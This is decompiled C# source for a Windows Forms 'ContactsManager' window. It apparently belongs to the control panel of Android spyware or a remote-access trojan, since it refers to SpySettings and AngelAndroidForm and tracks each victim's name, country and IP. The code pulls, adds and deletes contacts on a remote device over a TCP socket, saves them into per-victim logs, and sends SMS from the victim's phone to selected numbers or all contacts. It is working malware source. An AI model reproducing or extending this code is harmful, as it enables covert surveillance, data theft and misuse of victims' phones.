using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200004C RID: 76
[DesignerGenerated]
public partial class ContactsManager : Form
{
	// Token: 0x06000376 RID: 886 RVA: 0x000527D4 File Offset: 0x000509D4
	public ContactsManager()
	{
		base.Load += this.ContactsManager_Load;
		base.Activated += this.AngelAndroidForm_Activated;
		base.Deactivate += this.AngelAndroidForm_Deactivate;
		this.Title = "null";
		this.BoxTitlePaintEventArgsWait = false;
		this.InitializeComponent();
	}

	// Token: 0x06000379 RID: 889 RVA: 0x00053214 File Offset: 0x00051414
	public void translateme()
	{
		string language = RegistryHandler.Get_Language();
		checked
		{
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					int num = this.ctxMenu.Items.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						this.ctxMenu.Items[i].Text = Codes.Translate(this.ctxMenu.Items[i].Text, "en", "zh");
					}
				}
			}
			else
			{
				int num2 = this.ctxMenu.Items.Count - 1;
				for (int j = 0; j <= num2; j++)
				{
					this.ctxMenu.Items[j].Text = Codes.Translate(this.ctxMenu.Items[j].Text, "en", "ar");
				}
			}
		}
	}

	// Token: 0x0600037A RID: 890 RVA: 0x0005331C File Offset: 0x0005151C
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x0600037B RID: 891 RVA: 0x00053364 File Offset: 0x00051564
	private void ContactsManager_Load(object sender, EventArgs e)
	{
		this.translateme();
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\3.ico");
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
		}
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		this.BoxTitlePaintEventArgsWait = true;
	}

	// Token: 0x0600037C RID: 892 RVA: 0x00053418 File Offset: 0x00051618
	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(this.classClient);
		ThreadPool.QueueUserWorkItem(delegate(object a0)
		{
			reso.SAVEit((Array)a0);
		}, new object[]
		{
			this.DGV0,
			this.tmpFolderUSER,
			"Contacts Manager",
			this.tmpClientName,
			this.tmpCountry + " - " + this.tmpAddressIP,
			"Contacts",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	// Token: 0x0600037D RID: 893 RVA: 0x000534C8 File Offset: 0x000516C8
	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				"null",
				saveFileDialog.FileName,
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Contacts",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	// Token: 0x0600037E RID: 894 RVA: 0x0005359C File Offset: 0x0005179C
	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
					string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".contacts",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"del",
								Data.SPL_DATA,
								text,
								Data.SPL_DATA,
								text2
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
						this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
					}
				}
			}
		}
	}

	// Token: 0x0600037F RID: 895 RVA: 0x00053748 File Offset: 0x00051948
	private void AddToolStripMenuItem_Click(object sender, EventArgs e)
	{
		AddNumber addNumber = new AddNumber();
		addNumber.Text = "Add new contact";
		addNumber.L0.Text = "Enter Name";
		addNumber.L1.Text = "Enter Number";
		addNumber.StartPosition = FormStartPosition.Manual;
		addNumber.Location = Codes.FixSize(this, addNumber);
		DialogResult dialogResult = addNumber.ShowDialog(this);
		if (dialogResult == DialogResult.OK && this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".contacts",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.resultClient,
					Data.SPL_SOCKET,
					"add",
					Data.SPL_DATA,
					addNumber.InputText0.Text,
					Data.SPL_DATA,
					addNumber.InputText1.Text
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
		addNumber.Close();
	}

	// Token: 0x06000380 RID: 896 RVA: 0x00053884 File Offset: 0x00051A84
	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".contacts",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getContacts,
					Data.SPL_SOCKET,
					"contacts"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000381 RID: 897 RVA: 0x00053938 File Offset: 0x00051B38
	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (this.BoxTitlePaintEventArgsWait)
			{
				int count = this.DGV0.Rows.Count;
				string str = "All " + Conversions.ToString(count);
				string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, reso.f);
				Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (this.BoxTitle.Height != size2.Height + 3)
				{
					this.BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	// Token: 0x06000382 RID: 898 RVA: 0x00002860 File Offset: 0x00000A60
	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000383 RID: 899 RVA: 0x00002860 File Offset: 0x00000A60
	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000384 RID: 900 RVA: 0x00002860 File Offset: 0x00000A60
	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000385 RID: 901 RVA: 0x00053B04 File Offset: 0x00051D04
	private void SendSmsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (this.DGV0.SelectedRows.Count > 0 && this.classClient != null)
				{
					smsMaker smsMaker = new smsMaker();
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						string item = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						smsMaker.numslist.Items.Add(item);
					}
					if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
					{
						string text = smsMaker.msgtext.Text;
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						int value = 0;
						int value2 = 0;
						if (smsMaker.checkall.Checked)
						{
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"ssms<*>all<>",
									text,
									"#",
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(value),
									Data.SPL_SOCKET,
									Conversions.ToString(value2),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
						else
						{
							int num2 = smsMaker.numslist.Items.Count - 1;
							for (int j = 0; j <= num2; j++)
							{
								string text2 = Conversions.ToString(smsMaker.numslist.Items[j]);
								if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
								{
									object[] parametersObjects2 = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"ssms<*>",
											text2,
											"#",
											text,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											this.classClient.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										this.classClient
									};
									this.classClient.SendMessage(parametersObjects2);
								}
							}
						}
						EagleAlert.ShowSucess("your message was sent successfully");
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000386 RID: 902 RVA: 0x00002860 File Offset: 0x00000A60
	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000387 RID: 903 RVA: 0x00002860 File Offset: 0x00000A60
	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000388 RID: 904 RVA: 0x00002860 File Offset: 0x00000A60
	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x040003DC RID: 988
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	// Token: 0x040003DD RID: 989
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	// Token: 0x040003DE RID: 990
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddToolStripMenuItem")]
	private ToolStripMenuItem _AddToolStripMenuItem;

	// Token: 0x040003DF RID: 991
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	// Token: 0x040003E0 RID: 992
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x040003E1 RID: 993
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x040003E2 RID: 994
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x040003E3 RID: 995
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	// Token: 0x040003E4 RID: 996
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SendSmsToolStripMenuItem")]
	private ToolStripMenuItem _SendSmsToolStripMenuItem;

	// Token: 0x040003E5 RID: 997
	public TcpClient Client;

	// Token: 0x040003E6 RID: 998
	public Client classClient;

	// Token: 0x040003E7 RID: 999
	public string Title;

	// Token: 0x040003E8 RID: 1000
	public string tmpFolderUSER;

	// Token: 0x040003E9 RID: 1001
	public string tmpClientName;

	// Token: 0x040003EA RID: 1002
	public string tmpCountry;

	// Token: 0x040003EB RID: 1003
	public string tmpAddressIP;

	// Token: 0x040003EC RID: 1004
	private bool BoxTitlePaintEventArgsWait;
}
